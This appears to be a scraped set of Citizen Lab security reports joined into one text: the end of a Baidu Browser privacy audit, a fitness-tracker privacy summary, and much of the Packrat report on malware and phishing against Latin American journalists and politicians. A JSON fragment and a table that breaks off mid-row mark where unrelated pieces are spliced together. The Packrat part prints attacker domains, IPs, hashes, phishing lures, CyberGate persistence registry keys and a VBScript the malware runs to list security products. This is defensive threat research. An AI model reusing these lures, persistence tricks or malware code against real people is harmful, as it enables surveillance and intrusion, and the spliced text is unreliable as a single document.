addition to the leakage of personal user data, the lack of code signatures means that both versions, Windows and Android, are susceptible to a malicious in-path actor forcing the application to download and execute arbitrary code. While the Android version of the application would prompt a user to authorize the installation of such code, an effectively crafted APK could easily deceive a user into authorizing such an installation. The Windows version does not prompt the user in any way before downloading and executing code, leaving the user wholly susceptible to a malicious actor.\nThe advertised benefits of the proxy feature in Baidu Browser appear similar to those motivating Baidu’s recent partnership with CloudFlare, specifically, improved performance for Chinese users accessing Internet services outside of the country. We are uncertain, however, whether the proxy feature documented herein is technologically related to the CloudFlare partnership.\nWhile the advertised purpose of the proxy feature is to improve performance when accessing sites outside of China, our research demonstrates that this feature also permits users to access some otherwise banned websites from the browser. However, the pervasive collection and insecure transmission of personal user data by Baidu Browser means that using the browser to bypass censorship would require exposing a significant amount of personal data to Baidu and all in-path agents. In announcing their CloudFlare partnership, Baidu noted that it was “in contact with Chinese regulators from the beginning” of negotiations. It is unclear whether detailed user monitoring is required as a condition to providing access to a more efficient path to the wider Internet.\nQuestions for Baidu\nOn February 16, 2016, we sent a letter to Baidu with additional questions about the security vulnerabilities we identified, and committed to publishing their response in full. Read the letter here [PDF].\nBaidu responded to our questions on February 22, 2016. Read their full response here [PDF].\n\nUpdate: Analysis of updated versions of Baidu Browser\nWe analyzed version 6.4.14.0 of the Android version and version 8.2.100.3090 of the Windows to assess if the issues we identified and reported to Baidu has been fixed.\nAnalysis of Android client version 6.4.14.0\nOur initial analysis of version 6.2.18.0 of the Android client identified four general security and privacy issues. Our analysis of version 6.4.14.0 of the Android client, released in late January 2016, shows that some of these issues have been resolved and some remain unresolved:\na. Leaks sensitive data on startup and Phones home with sensitive data about every page view\nThese issues appear to have been resolved insofar as the same information appears to be communicated by the application to Baidu servers but now it is encrypted using SSL.\nb. Leaks sensitive data and address bar contents when inputting into address bar\nThis issue remains unresolved. In our communications with Baidu, they indicated they would not be fixing this issue. However, in addition to the contents of user searches, the browser still also includes sensitive data such as a user’s IMEI in an easily decryptable format in the request URL.\nc. Insecurely checks for software updates\nThis issue has been resolved. Software updates are now checked using HTTPS.\nAnalysis of Windows client version 8.2.100.3090\nOur initial analysis of version 7.6.100.2089 of the Windows client identified four general security and privacy issues. Our analysis of version 8.2.100.3090 of the client, released January 21, 2016, shows that only one of these issues has been addressed.\na. Leaks address bar contents when inputting into address bar\nThis issues remains unresolved. In our communications with Baidu, they indicated they would not be fixing this issue.\nb. Communicates with Baidu servers via an easily decryptable protocol and Phones home information about every page view that includes hardware serial numbers\nThese issues remain unresolved. Our analysis indicates that data is still transmitted with easily decryptable encryption. In addition, every protobuf request sent to the dr.br.baidu.com domain now includes the user’s hard drive serial number and MAC access unencrypted in the header, a behavior not identified in the earlier version 7.6.100.2089 of the application that we analyzed in this report.\nc. Insecurely checks for software updates\nThe application still checks for software updates unencrypted over HTTP; however, it now verifies the authenticode digital signature of the downloaded update to have been signed by Baidu.\nAcknowledgments\nThe Citizen Lab would like to thank Seth Hardy from Lookout for assistance with this report.

Every Step You Fake  investigates the privacy and security properties of eight popular wearable fitness tracking systems. We use a variety of technical, policy, and legal methods to understand what data is being collected by fitness tracking devices and their associated mobile applications, what data is sent to remote servers, how the data is secured, with whom it may be shared, and how it might be used by companies.\nThis research is led by Citizen Lab research partner Open Effect, with significant contributions from the Citizen Lab. The project is funded by the Office of the Privacy Commissioner of Canada’s Contributions Program.\nToday, we are releasing two sections of the report so that consumers can know what companies are doing to secure their personal information. The two sections being released are the study background, and our technical methodology and findings.\nOur key technical findings include:\n\nSeven out of eight fitness tracking devices emit persistent unique identifiers (Bluetooth Media Access Control address) that can expose their wearers to long-term tracking of their location when the device is not paired, and connected to, a mobile device\nJawbone and Withings applications can be exploited to create fake fitness band records. Such fake records call into question the reliability of that fitness tracker data use in court cases and insurance programs.\nThe Garmin Connect applications (iPhone and Android) and Withings Health Mate (Android) application have security vulnerabilities that enable an unauthorized third-party to read, write, and delete user data\nGarmin Connect does not employ basic data transmission security practices for its iOS or Android applications and consequently exposes fitness information to surveillance or tampering\n\nThe researchers sought contact with the seven fitness tracker companies whose products exhibited security vulnerabilities; Apple was not contacted because researchers found no technical vulnerabilities in the Apple Watch using their methodology. Fitbit, Intel (Basis), and Mio responded and engaged the researchers in a dialogue. Fitbit further expressed interest in exploring the topic of implementing Bluetooth privacy features in its communications with the researchers.\nFitness data can provide detailed insights into people’s lives. It is used in an increasing number of areas such as insurance, corporate wellness, and courts of law. Consumers deserve to be better informed about fitness tracking systems’ privacy and security practices to help them determine whether or not they are comfortable with how their fitness data is being used.\nRead the full report.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: John Scott-Railton*, Morgan Marquis-Boire*, Claudio Guarnieri*, and Marion Marschalek**\n\n*Senior Researcher, Citizen Lab, Munk School of Global Affairs; **Cyphort\nRead the press release.\nMedia coverage: Associated Press, Vice Motherboard, CBC, Clarin, ABC News, Fortune, Security Week, CIO, Softpedia, PC World, Global News, El Universo, The Register, US News & World Report, The Washington Free Beacon.\nSummary\nThis report describes an extensive malware, phishing, and disinformation campaign active in several Latin American countries, including Ecuador, Argentina, Venezuela, and Brazil. The nature and geographic spread of the targets seems to point to a sponsor, or sponsors, with regional, political interests. The attackers, whom we have named Packrat, have shown a keen and systematic interest in the political opposition and the independent press in so-called ALBA countries (Bolivarian Alternative for the Americas), and their recently allied regimes. These countries are linked by a trade agreement as well as a cooperation on a range of non-financial matters.\nAfter observing a wave of attacks in Ecuador in 2015, we linked these attacks to a campaign active in Argentina in 2014. The targeting in Argentina was discovered when the attackers attempted to compromise the devices of Alberto Nisman and Jorge Lanata.  Building on what we had learned about these two campaigns, we then traced the group’s activities back as far as 2008.\nThis report brings together many of the pieces of this campaign, from malware and phishing, to command and control infrastructure spread across Latin America. It also highlights fake online organizations that Packrat has created in Venezuela and Ecuador.  Who is responsible? We assess several scenarios, and consider the most likely to be that Packrat is sponsored by a state actor or actors, given their apparent lack of concern about discovery, their targets, and their persistence.  However, we do not conclusively attribute Packrat to a particular sponsor.\nPart 1: Packrat’s Seven Years of Activity\nThe authors on this report have been independently investigating malware and phishing campaigns in Latin America.  This report is the result of discovering that the cases we have been investigating are linked by a common threat actor with targeting in several countries, including Venezuela, Ecuador, Argentina, and Brazil. We refer to this threat actor as Packrat, to highlight their preference for packed, commodity Remote Access Trojans (RATs), and their retention of the same domains and servers over many years.\nImage 1: Some of Packrat’s known targets and activity types\nPackrat has systematically targeted high profile political figures, journalists, and others in several countries with malware and phishing. In total we uncovered 12 different malware command and control domains, and over 30 samples of malware stretching over a seven year time period. Packrat also favors an interesting strategy: create and maintain fake opposition groups and news organizations, then use these to distribute malware and conduct phishing attacks.\nSome of these organizations exist in name only, while others have a more elaborate online presence. Packrat has also created elaborate fake news organizations without any evidence we can find of malware or phishing activity.\nImage 2: Packrat’s major activities\nWe chart Packrat’s activities back to at least 2008. Through correlation of network infrastructure, we identified several waves of activity, coupled with changes in tools and tactics. This section provides a brief chronology of Packrat’s network infrastructure and activities. For a detailed chronology of the malware used, see 3. The Evolution of Packrat’s Implants.\nPackrat’s Greatest Hits\n2008-2013\nTools and infrastructure used by Packrat suggest that they have been active since at least 2008. During this period, Packrat used hosting services in Brazil, and some of their malware samples were uploaded from Brazilian IP space to popular online virus scanning services. Some of the messages they sent also contained Brazilian bait content. While this is suggestive of Brazilian targeting, we have yet to find confirmed victims from this period.\n2014\nBy 2014, Packrat was targeting high-profile Argentine lawyer Alberto Nisman, and well-known investigative journalist and television news host, Jorge Lanata. Maximo Kirchner, son of Argentina’s president, also announced that he was targeted. The screenshot he released of the phishing email he received is consistent with what we have seen, although we have not been able to verify his claims. In addition, a number of phishing domains with Ecuadorian and Venezuelan targeting that we identified became active during this period.\n2015\n2015 seems to have marked an extensive campaign of phishing and malware attacks targeting civil society and public figures, including parliamentarians in Ecuador. We observed a range of phishing domains and attacks, often using fake organizations during this period. We also found fake organizations and possible disinformation campaigns with targets in Ecuador, Venezuela and the Venezuelan diaspora.\n1.1 Nisman and the Argentine Cases\nIn January 2015, controversial Argentine prosecutor Alberto Nisman was found dead of a gunshot under suspicious circumstances. Argentine news reported that a malicious file was found on his Android phone by the Buenos Aires Metropolitan Police forensic lab. The file was named “estrictamente secreto y confidencial.pdf.jar,” or “strictly secret and confidential” in English.\nAn identically titled file was uploaded to VirusTotal from Argentina on the 29th of May, 2015. The file was a remote access toolkit, known as AlienSpy, which allowed an attacker the ability to record the activities of a target, access their email, their webcam, and more. However, the file was built for the Windows operating system, and could not have infected Nisman’s Android phone.\nThe initial analysis of the alienspy implant by Morgan Marquis–Boire revealed the command and control server of the attackers to be deyrep24.ddns.net. In addition to the malware apparently used to target Nisman, Lanata, and Kirchner (see below), three other samples[1] were found which used deyrep24.ddns.net as a command and control domain. One of these, 3 MAR PROYECTO GRIPEN.docx.jar, was a build of AlienSpy (See Packrat’s Implants) which masqueraded as a document containing communication between Ecuadorian President Rafael Correa and Ecuador’s Ambassador to Sweden concerning the acquisition of fighter jets.\nAfter the finding was made public, other targets came forward. Prominent investigative journalist and television host Jorge Lanata revealed that he too had been targeted by the same malware. The president’s son, Maximo Kirchner, also claimed to have been targeted. We were unable to verify Kirchner’s claim, however, a screenshot showing his targeting was included in a report of this claim:\nImage 3: A screenshot included in this report showing Maximo Kirchner’s targeting\nThe email which he claims to have received has an attachment named “Estrictamente Secreto y Confidencial.pdf.jar” (size 67.3kb) which is the same as the malware sent to Nisman and Lanata. Additionally, the sender’s email address (claudiobonadio88@gmail.com) purports to be well-known judge Claudio Bonadio. This similar to the targeting of Lanata, who also received an email also claiming to be from Claudio Bonadio (cfed.bonadio@gmail.com).\n1.2 Ecuadorian Campaigns\nIn 2015, we began independently receiving a growing number of reports of phishing attacks via e-mail and SMS targeting journalists and other public figures in Ecuador. Some emails we examined had no political content, but were simple credential phishing for social media and email providers, like Gmail. Others, however, had explicit political content concerning a range of political figures and issues in Ecuador. Further investigation revealed an extensive campaign, as well as many fake organizations (See Section 6: Possible Deception Operations).\nOne of the authors developed a Gmail search query for strings associated with the attacks (See Appendix A: The Search Query). We shared this query with many potential targets, resulting in hits for phishing attacks, as well as suspicious Microsoft Word (DOCX) files sent to a range of journalists and public figures. These documents contained embedded RATs written in Java, including Adzok and AlienSpy (See Packrat’s Implants). Subsequently, using indicators found in the JAR files, as well as an updated Gmail query we were able to identify a larger set of malicious files and domains used by Packrat (See Appendix B: Malware Samples).\nWe found a dense web of interconnections between phishing and malware sites. Sites often shared registration information, or were hosted from the same servers. We determined that the malware samples typically communicated with daynews.sytes.net, which is linked to the Argentine cases. Ultimately, investigation of this infrastructure also revealed malware and infrastructure in Brazil, and fake sites in Venezuela.\n1.3 Shared Command & Control Infrastructure\nThis section describes Packrat’s command and control infrastructure in narrative form, Appendix B provides a full list of Command & Control domains along with the related binaries and malware families.\nPackrat’s deyrep24.ddns.net domain was created on November 7th, 2014, and at the time of Nisman’s targeting, pointed to the IP address: 50.62.133.49.  This IP address belongs to a GoDaddy range for dedicated hosting, and on March 3rd, 2015, the domain moved to another GoDaddy IP: 192.169.243.65. Passive DNS records revealed that at the same time as this IP was being used by the deyrep24.ddns.net command and control domain, it was being used by the domain daynews.sytes.net which had been created on March 1st, 2015. Over the course of our joint investigation we found 5 samples of malware using this domain which were used to target journalists and civil society in Ecuador (See Appendix D: Seeding Domains for a larger list).\nPackrat’s Command & Control Infrastructure\nImage 4: Packrat’s Command and Control infrastructure [Click image for hires]Searching for domains related to daynews.sytes.net lead us to taskmgr.serveftp.com which on the August 11th, 2014 was at the IP address 190.210.180.181, an IP address in Argentina, used by daynews.sytes.net for a brief period when it was first registered, before being quickly moved to GoDaddy hosting. The taskmgr.serveftp.com domain also returns to 190.210.180.181 on multiple dates in October of 2014, and May of 2015. On July 23rd, 2014, taskmgr.serveftp.com was hosted at 201.52.24.126, a Brazillian IP address, which was also hosting taskmgr.servehttp.com, and taskmgr.redirectme.com. We found a total of 15 malware samples using either taskmgr.servehttp.com or taskmgr.serveftp.com as command and control domains (or both in the case of several samples). The earliest of these samples had a compile time of December 24th, 2008, providing us with the earliest date we know of that Packrat was active. While it is possible that this timestamp is faked, we have seen no evidence of this on other samples by these attackers.\nPackrat’s Command and Control Infrastructure\n\n\n\nDomain\nRelevant Resolution\nRelevant Date of resolution\n\n\ndeyrep24.ddns.net\n50.62.133.49\nNovember 7th, 2014\n\n\n\n192.169.243.65\nMarch 3rd, 2015\n\n\ndaynews.sytes.net\n192.169.243.65\nMarch 3rd, 2015\n\n\n\n190.20.180.181\nMarch 1st, 2015\n\n\ntaskmgr.serveftp.com\n190.210.180.181\nAugust 11th, 2014\n\n\n\n201.52.24.126\nJuly 23rd, 2014\n\n\n\n186.220.1.84\nJuly 11th, 2014\n\n\ntaskmgr.servehttp.com\n186.220.1.84\nJune 24th, 2014\n\n\n\n201.52.24.126\nJuly 23rd, 2014\n\n\n\n186.220.1.84\nJuly 11th, 2014\n\n\n\n186.220.11.67\nAugust 15th, 2014\n\n\ntaskmgr.redirectme.com\n201.52.24.126\nJuly 23rd, 2014\n\n\n\n186.220.1.84\nJuly 11th, 2014\n\n\nruley.no-ip.org\n186.220.1.84\nJuly 11th, 2014\n\n\n\n189.100.148.188\nSeptember 6th, 2012\n\n\nlolinha.no-ip.org\n189.100.148.188\nSeptember 6th, 2012\n\n\nwjwj.no-ip.org\n189.100.148.188\nSeptember 6th, 2012\n\n\nconhost.servehttp.com\n186.220.11.67\nAugust 15th, 2014\n\n\ndllhost.servehttp.com\n186.220.11.67\nAugust 15th, 2014\n\n\nwjwjwj.no-ip.org\n179.208.187.216\nMarch 25th, 2014\n\n\n\n186.220.1.84\nJune 24th, 2014\n\n\nwjwjwjwj.no-ip.org\n179.208.187.216\nMarch 25th, 2014\n\n\n\nOn July 11th 2014, all ‘taskmgr’ domains were hosted on 186.220.1.84, an IP address in Brazil. At the same time, this IP address was hosting ruley.no-ip.org. We managed to find a malware sample[2] using both ruley.no-ip.org and taskmgr.servehttp.com as command and control domains. On September 6th, 2012, ruley.no-ip.org was hosted at 189.100.148.188, another Brazillian IP address, along with two other domains lolinha.no-ip.org and wjwj.no-ip.org. We found two samples configured with all three of these domains as command and control servers, three samples which used both ruley.no-ip.org and wjwj.no-ip.org, two samples just using wjwj.no-ip.org, and one sample just using ruley.no-ip.org. On August 15th, 2014, taskmgr.servehttp.com was hosted on 186.220.11.67, another IP address in Brazil. On the same date, this IP hosted both conhost.servehttp.com and dllhost.servehttp.com. We found two samples configured with both conhost.servehttp.com and dllhost.servehttp.com as command and control servers.\nIn addition to these domains, the domains wjwjwj.no-ip.org and wjwjwjwj.no-ip.org appear to be related. On March 25th, 2014 both wjwj.no-ip.org and wjwjwj.no-ip.org point to 179.208.187.216. On June 24th, 2014, both taskmgr.servehttp.com and wjwjwjwj.no-ip.org pointed to 186.220.1.84. We didn’t manage to find malware samples related to either wjwjwj.no-ip.org or wjwjwjwj.no-ip.org. \nThe command and control servers behind these domains were hosted with a variety of providers around Latin America, including: Uruguay Montevideo Administración Nacional De Telecomunicaciones, Argentina Buenos Aires Nss S.A. (IPLAN), and Claro Brazil.\nPackrat has also used servers in Europe and the US, including Portlane AB in Sweden and GoDaddy in the United States.\nWe have notified hosting providers in order to facilitate the shutdown of Packrat’s infrastructure.\nPart 2: Recent Malware Attacks in Ecuador\nPackrat is active in many countries, but it is in Ecuador that we were able to gather the most systematic evidence of their activities, as well as connect directly with targets and victims. We are also tracking active attacks against Ecuadorian targets at the time of writing.\nImage 5: Some of Packrat’s known target groups in Ecuador\nUsing email inbox search queries that we shared with potential targets (See: Appendix A), as well as analysis of malware databases and seeding infrastructure, we collected a diverse set of malware and phishing attacks targeting journalists, public figures, politicians, and other prominent individuals (see: 5. Packrat’s Persistent Phishing Campaigns for examples).\n2.1 Previous Reports of Packrat Malware in Ecuador\nThere are public reports, as well as social media mentions, that point to politically-linked malware attacks Ecuador by Packrat. For example, Ecuadorian freedom of expression organization Fundamedios reported that public figures, satirical news organizations, the director of Fundamedios, and others, had received suspicious messages and phishing attempts. Fundamedios later updated their reporting to note that Access Now had stated that some of these attacks shared command and control infrastructure with the malware that was reportedly used to target Nisman. There are also indications on Twitter of phishing attacks and malware. We have been able to link many of these reports to Packrat.\n2.2 Common Techniques\nWe observed a range of social engineering techniques used to send malware to Ecuadorian targets. In the cases where we observed seeding, we found that the malware was often accompanied by political bait content, frequently relevant to Ecuador’s opposition. In other cases, the seeding was personalized to the intended victim. The most common delivery mechanism was via Microsoft Word DOCX files containing malicious Java. However, in other cases, attackers used fake updates.\nCommon Seeding Techniques\n\n\nEmailed as attached malicious files\nAs links to malware hosted on sites controlled by the attackers\nOn Google Drive or Onedrive\nPopups or fake update notifications on politically themed / lookalike sites\n\n\nPackrat often uses email senders and websites in its social engineering that appear similar to real persons and organizations. For example, they registered ecuadorenvivo.co, which looks like the genuine domain of the Ecuador En Vivo news website (ecuadorenvivo.com). Packrat then sent e-mails purporting to be e-mail news updates (a practice by the real Ecuador En Vivo) from the ecuadorenvivo.co domain.\nPackrat also sometimes creates identical paths to real news stories, and hides them under clickable links. For example:\nTypical Lookalike Domain\nWhat the target sees:\nhttp://ecuadorenvivo.com/videos/el-meme-que-volvio-loco-a-correa.html\nHREF of the actual malicious link:\nhttp://ecuadorenvivo.co/videos/el-meme-que-volvio-loco-a-correa.html\n2.3 Three Attacks in Detail\nTo illustrate Packrat’s approach, this section describes three recent attacks in detail. The attacks date from between Spring and Fall 2015. Targets of these attacks include Ecuadorian journalists and public figures.\n2.3.1 Attack 1: Email from a fake opposition movement\nThroughout April 2015, multiple targets received e-mails from the “Movimento Anti Correista” (English: “Anti Correa Movement”), a fictitious group (based on open source searches and consultation with individuals familiar with the region) that purports to be opponents of Ecuador’s current president, Rafael Correa. The emails contained a Microsoft Word DOCX attachment containing Adzok malware (See: Section 3. The Evolution of Packrat’s Implants), as well as text and graphics to bolster the fiction.\nExample Seeding E-mail from “Movimento Anti Correista”\nImage 6: Example Seeding E-mail from “Movimento Anti Correista”\nSeeding text translation:\nSubject: Foul Play by Rafael Correa Against the Opposition\nBody:\nWe are sharing with you this leaked document about President Rafael Correa’s dirty tricks against the opposition\n(Open on a PC, this cannot be read on a phone.)Coming soon more leaks on: www[.]movimientoanticorreista.com\nThe e-mail seems intended for several purposes. It is obviously designed to trick the target into downloading and viewing the document, but it also seems to be an effort to establish the legitimacy of the domain, and the identity of the movement.\nThe Malicious Attachment\nName La jugada sucia De Correa ante la oposición.ppt\nType: Microsoft Word Document file (.docx)\nMD5: ea7bcf58a4ccdecb0c64e56b9998a4ac\nImage 7: Seeding email with text\nEmbedded in this document is software called “Adzok – Invisible Remote Administrator.” Analysis of the malware can be found in Section 3: The Evolution of Packrat’s Implants and the configuration of this implant can be found in Appendix C: Malware Configuration.\n2.3.2 Attack 2: You are being spied on!\nThis attack is designed to create a sense of fear and concern in the target, leading to the file being opened. The e-mail is customized for the target’s name, and claims that the target is being spied on by SENAIN, Ecuador’s National Intelligence Secretariat. The attachment purports to be a list of Twitter users spied on by SENAIN. Interestingly, the purported sender is “Guillermo Lasso,” the defeated challenger in Ecuador’s last presidential election.\nImage 8: Email with the purported sender as “Guillermo Lasso,” the defeated challenger in Ecuador’s last presidential election\nSeeding text translation:\nSubject: [Target’s Name] spied on by SENAIN\nBody:\nGreetings,G.L\nNote: Open this on your personal computer. It can’t be opened by smartphones.\nLike Attack 1, the malware is not delivered with an exploit, but rather requires that the victim double clicks on the file and accepts any prompts before executing it.\nThe document instructs the target to click:\nImage 9: Document instructing the target to click\nEnglish Translation\nIn English: TO READ ALL THE TWEETS DOUBLE CLICK ON THE GRAPHIC OF TWITTER\nWhen the image is double clicked, the victim is infected with malware from the AlienSpy family. Examining the configuration file of the malware reveals that the malware uses the the C2 server daynews.sytes.net, which is a domain common to several Packrat attacks. Interestingly, we found that the same document (identical MD5) was re-purposed for several other attacks.\n\n\n\nFile Name\nMD5\n\n\nLOS TUITEROS ESPIADOS POR SENAIN.docx\nefc0009d76a2057f86c5f00030378c72\n\n\nLos trinos de Rafael Correa.docx\nefc0009d76a2057f86c5f00030378c72\n\n\n\nDetailed analysis of the malware can be found in Section 3 and the configuration of this implant can be found in Appendix C.\n2.3.3 Attack 3: “Exclusive Information about Correa’s Lies”\nThis attack was served via a link to a fake political website hosting malicious content. The e-mail served to direct the victim to the site. Interestingly, the attack attempts to trick the target into believing that it originates from the legitimate investigative journalism site Focus Ecuador. Packrat appears to have acquired the .tk and .info domains of the same name, just as they had with Ecuador En Vivio.\nDe: Focus Ecuador <focusedtior1@gmail.com>\nFecha: [September, 2015 REDACTED]\nAsunto: FOCUS ECUADOR ADELANTA EL VIDEO DEL ESCANDALO\nPara: [REDACTED]\nEl informe sobre las mentiras de Correa: ver video exclusivo: http://focusecuador.tk/\nEnglish Translation\nFrom: Focus Ecuador <focusedtior1@gmail.com>\nDate: [September, 2015 REDACTED]\nSubject: FOCUS ECUADOR THE VIDEO SCANDAL\nTo: [REDACTED]\nInformation on the lies of Correa see the exclusive video: http://focusecuador.tk/\nThe email also contains a tracking image from the domain mesvr.com, which is commonly used by ReadNotify, a service used to track the delivery of emails. It appears that the attackers were hoping to gain additional information about their targets, such as possibly de-anonymizing the IP addresses of targets who might be reluctant to open files.\nThe focusecuador.tk lookalike website contained content scraped from the legitimate site, but also showed victims a Flash update notification. When clicked, the link triggered the download of “plugin_video.jar”.\nThe fake Flash update notification\nImage 10: Fake Flash update\nThis is not a flash update, but a bundle of the AlienSpy / Adwind Remote Access Toolkit. When executed, this java-based malware establishes communications with Packrat’s familiar Command & Control server at 46.246.89.246 (daynews.sytes.net). Analysis of the malware reveals an identical configuration to the LOS TUITEROS ESPIADOS POR SENAIN.docx and the Los trinos de Rafael Correa.docx samples.\nAttack 3: Binary\nName: plugin_video.jar\nType: Java Archive (JAR)\nMD5: 74613eae84347183b4ca61b912a4573f\nDetailed analysis of the malware can be found in Section 3 and the configuration of this implant can be found in Appendix C.\n2.4 Packrat Speaks!\nDuring the course of our behavioral analysis of Attack 3, a Packrat operator began to communicate to one of the Citizen Lab researchers in Spanish and English on an infected machine.\nImage 11: Threats and taunts as they appeared on the Citizen Lab researcher’s screen\n \nThe taunts were delivered as popups and text displayed in Internet Explorer. The tone was threatening and vulgar. This one reads “You like playing the spy where you shouldn’t, you know it has a cost: your life!” Some of the messages sound stilted or non-idiomatic in the original Spanish, which might or might not be intentional, or provide clues as to the native dialect (or mother tongue) of the operator.\nMore Taunts: Translated English and Original Spanish\n\n\n\nTranslation\nOriginal\n\n\nNow you are in trouble !

This kind of engagement could be considered a serious breach of operational security. Packrat took exception to these unwritten rules. It may be that Packrat has experienced other cases of individuals touching their infrastructure, or attempting to analyze their files, especially after some of their infrastructure was exposed. Since Packrat prefers to leave the infrastructure online, they may be trying to discourage unwelcome attention.\n3. The Evolution of Packrat’s Implants\nOver the past seven years Packrat has used several different types of malware, much of it off-the-shelf RATs, such as Cybergate, Xtreme, AlienSpy, and Adzok. While these malware families are known to researchers, Packrat typically obfuscates their malware using a range of tools, including: an unknown VB6 crypter, AutoIt3Wrapper, UPX, PECompact, PEtite, and Allatori Obfuscator. This layer of obfuscation means that Packrat’s attacks frequently escaped detection by antivirus when the attacks were deployed. This section describes these tools, roughly grouped into distinct time periods.\nImage 12: Packrat malware families\n3.1. 2008-2014: Packed RATS, mostly CyberGate\nBetween 2008 and 2014, Packrat made extensive use of off-the-shelf RATs encapsulated in AutoIt3Wrapper, a runtime packer. This packer is written in AutoIt, a compilable scripting language for automating tasks in Windows. The use of an initial obfuscation layer seems to have been enough to thwart or at least misguide detection, as well as leverage some basic anti-debugging techniques.\nThe majority of implants that are then dropped and executed appear to be CyberGate RAT. In 2013 and 2014, Packrat seems to have adopted XtremeRAT as well. Cybergate and Xtreme are both written in Delphi and share code with each other and other Delphi based RATs, SpyNet and Cerberus.\nMany of these attacks included embedded decoy Office documents that are opened at execution of the implant, likely in the context of a targeted attack. Among the documents we found are résumés of purported Brazilian citizens, as well as purported payment receipts of the Association of Lawyers of Sao Paulo, Brazil.\nImage 13: A résumé\nThese attacks suggest that Packrat had Portuguese speaking targets during this period. Based on the specifics of the bait documents, it seems likely that they were Brazilian.\nImage 14: Payment receipt\nThe majority of the implants we found were configured to beacon back to a Command & Control, taskmgr.servehttp.com, although a few others include ruley.no-ip.org, lolinha.no-ip.org, and taskmgr.serveftp.com (See Appendix B for a complete list).\n3.1.1 Analysis of CyberGate RAT\nThe CyberGate RAT samples we analyzed were, as mentioned above, typically wrapped in a layer of AutoIt. Code and strings found in the binary indicate that it is based on the Spy-Net RAT version 2.6. This RAT was developed by a Brazilian hacker using the handle spynetcoder and is outlined on the Spy-Net RAT ‘official’ website.\nCyberGate’s Infection Routine\nAfter unpacking from the applied runtime packer, CyberGate runs its second stage, which is likeley the infection routine. This injects the third stage, a DLL, into a running process. Once implanted, CyberGate then deploys a range of techniques for persistence and monitoring.\nThe third stage module picks from three execution paths (based on mutexes, which can also be set by a prior infection):\n\nPassword gathering (mutex: “_x_X_PASSWORDLIST_X_x_”)\nBlock mouse and keyboard input to any other application (mutex: “_x_X_BLOCKMOUSE_X_x_”)\nInfection routine\n\nCyberGate Anti Analysis\nThe infection routine comes with a set of anti-analysis features packaged in a single function. CyberGate searches for a range of virtual and sandbox environments.[3] It also checks for user space debuggers through the IsDebuggerPresent API, and for SoftICE and Syser through their respective pipes. The malware performs breakpoint detection on the function entries of the listed anti-analysis features by checking whether the first byte of each function equals ‘CC’, the bytecode indicating a breakpoint.\nImage 15: CyberGate Anti Analysis\nCyberGate Process Injection\nThe infection routine fetches the encrypted implant from the resource section, and upon decryption attempts to inject its implant into the Windows system shell process (explorer.exe). If this fails, CyberGate launches an explorer.exe process on its own, injects its implant into it, and then completes the setup. Additionally, another instance of the CyberGate implant is injected into a default browser process, which runs invisibly.\nThe infection routine drops a copy of itself into different directories, depending on the Windows version: /System, /Windows, or /Program Files. The implant’s name varies: taskhost.exe, regedit.exe, or taskmgr.exe are all common. The infection routine also writes a copy of the encrypted implant into the %TEMP% directory and names it XX–XX–XX.txt.\nTo achieve persistence, the second stage writes registry keys so that CyberGate is run at startup:\nHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\%GUID%\\StubPath: “C:\\WINDOWS\\System32\\regedit.exe”\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\Policies: “C:\\WINDOWS\\System32\\regedit.exe”\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\msconfig: “C:\\WINDOWS\\System32\\regedit.exe”\nPassword Collection\nIf tasked with password collection, the second stage binary grabs passwords from a range of locations, including: the No-ip Dynamic Update Client (DUC), MSN messenger, Firefox, and Internet Explorer. The credentials are collected from the Windows Registry, browser profiles, the RAS dial up settings, Local Security Authority (LSA) settings, MS ProtectedStorage, MS IntelliForms, and the credential store.\nCyberGate’s Functionality\nThe CyberGate implant runs two instances. The first runs in the default browser process, and acts as the monitoring component. Meanwhile, the explorer.exe instance serves as ‘watchdog,’ ensuring persistence and making sure the infector binary on disk doesn’t disappear.\n \nImage 16: Searching for indicators of an existing Spy-Net installation\nThe CyberGate implant comes with the same credential stealing capabilities as the infector, and is extended by routines to spy on Chrome and STEAM credentials as well. Also inherited from the infector, the implant owns the same anti-analysis routine protecting it from sandboxes and debuggers.\nBeyond the capabilities seen in the infector, CyberGate has a range of features that provide an attacker with a full spectrum of monitoring and remote control functionality.\nCyberGate capabilities include:\n\n\nCollecting detailed information about the infected system\nActivation and control of the webcam and microphone\nScreenshot capture\nBlocking user input (e.g. keyboard and mouse)\nControl over processes, windows, applications, devices, drive, ports, TCP & UDP connections, the clipboard, registry keys and values etc.\nControl over the filesystem\nDownload and execution of further binaries\nExfiltration via FTP\nCollection of information on installed security products\n\n\nInterestingly, CyberGate gathers information on installed security products through the Windows Management Instrumentation (WMI) by launching cscript.exe on a hardcoded .vbs-script. The script requests name and version number of installed antivirus and firewall solutions and dumps the data to a file:\nSet objSecurityCenter = GetObject(“winmgmts:.rootSecurityCenter”)\nSet colFirewall = objSecurityCenter.ExecQuery(“Select * From FirewallProduct”,,48)\nSet colAntiVirus = objSecurityCenter.ExecQuery(“Select * From AntiVirusProduct”,,48)\nSet objFileSystem = CreateObject(“Scripting.fileSystemObject”)\nSet objFile = objFileSystem.CreateTextFile(“%FILEPATH%”, True)\nEnter = Chr(13) + Chr(10)\nCountFW = 0\nCountAV = 0For Each objFirewall In colFirewall\nCountFW = CountFW + 1\nInfo = Info & “F” & CountFw & “) ” & objFirewall.displayName & ” v” & objFirewall.versionNumber &\nEnter\nNextFor Each objAntiVirus In colAntiVirus\nCountAV = CountAV + 1\nInfo = Info & “A” & CountAV & “) ” & objAntiVirus.displayName & ” v” & objAntiVirus.versionNumber &\nEnterobjFile.WriteLine(Info)\nobjFile.Close\nCollected data is stored in dump files on disk and exfiltrated to the remote server component by HTTP or FTP.\n3.1.2 Analysis of XTremeRAT\nXTremeRAT is commercial off-the-shelf malware, often available cracked, and used to monitor victim machines. While used by apolitical hackers, XTremeRAT has been extensively used by government-linked malware groups to target the opposition during the ongoing Syrian Civil War, as well as by other politically-motivated groups in the Middle East and North Africa. It has also been extensively analyzed, and we encourage interested readers to review some of these analyses.\nWhile often packed, XTreme RAT itself has limited stealth and persistence functionality. Its monitoring capabilities are also straightforward. The versions we analyze here have no code obfuscation. XTreme Rat is implemented as client/server architecture, where the infected machine acts as server, while the C&C component is the client.\nThis version of Xtreme Rat’s capabilities include:\n\n\nLogging keystrokes\nLogging the name of the foreground desktop application\nSniffing the clipboard for passwords\nDownloading and executing binaries via HTTP, 